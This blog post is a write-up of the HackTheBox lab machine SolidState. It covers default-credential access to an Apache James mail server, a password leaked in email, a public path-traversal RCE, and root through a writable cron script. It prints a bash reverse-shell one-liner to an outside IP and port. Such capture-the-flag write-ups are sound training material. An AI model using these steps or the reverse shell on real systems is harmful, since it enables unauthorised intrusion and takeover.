---
layout: post
title: HackTheBox&#58; SolidState
description: Writeup for HTB box SolidState.
category: HackTheBox
---

### Introduction

SolidState is a Linux box, difficulty Medium on HTB.

For user part, we use weak default credential to get access to the mail system, which contains credential for a restricted shell.
For pivesc part, first we need to escape the restricted shell, then modify a script that is included in a root cron job.

### Initial Scan

![SolidState-1](/resources/SolidState-1.png)

### Initial Foothold: Apache James

We see smtp is running on port 25 and pop3 is running on port 110, which implies this is a mail server.
By telnet to the 2 ports to see the banners, we can see that the machine is running Apache James version 2.3.2.
We can find the documentation for version 2.0 [here](https://james.apache.org/server/archive/configuration_v2_0.html).

The server has a remote manager service running on port 4555.
By telnet to that port we can see that this service is exposed.
Trying default credential `root:root` (from documentation) gives us access to the panel.

![SolidState-2](/resources/SolidState-2.png)

### User: mindy's Email

Running HELP in the manager panel shows a list of commands, such as list users, add users or change password.
We see that there are 5 users in the server: `mailadmin`, `james`, `thomas`, `john`, `mindy`.

We can reset their passwords, for example `setpassword mailadmin mailadmin`.
This gives us access to each individual mailbox.
Login to `mindy` account through pop3 on port 110 and check her second mail, we see the credential of `mindy`: `mindy:P@55W0rd1!2@`

Login with this credential, we get a restricted shell and we can read user.txt.
![SolidState-3](/resources/SolidState-3.png)

### Privesc: Escape Restricted Shell

As mention above (and by reading all emails) we notice that `mindy` can only execute certains commands.
Searching Apache James version 2.3.2 on ExploitDB we can see that there is 1 RCE vulnerability with it.

The PoC along with a paper about it can be found [here](https://www.exploit-db.com/exploits/35513) and [here](https://www.exploit-db.com/docs/english/40123-exploiting-apache-james-server-2.3.2.pdf).
Basically by creating an user named `../../../../../../../../etc/bash_completion.d` (LFI-ish), we can add malicious payload into `/etc/bash_completion.d` folder.
This means everytime an user logs into the system the payload would be executed as that user.

By modifying the payload in the script number 35531 to be the reverse shell and logging in as `mindy`, we get a non-restricted reverse shell back.
```bash
bash -c bash -i >& /dev/tcp/10.10.14.25/1337 0>&1
```
![SolidState-4](/resources/SolidState-4.png)

### Privesc: Root Cronjob

By using [pspy](https://github.com/DominicBreuker/pspy) to monitor, we discover that there is a root cronjob running every 3 minutes.
![SolidState-5](/resources/SolidState-5.png)

The cron executes `/opt/tmp.py`, which we have full read/write permission.
By changing the file to a Python reverse shell (and some waiting), we get a root shell and we can read root.txt.
![SolidState-6](/resources/SolidState-6.png)
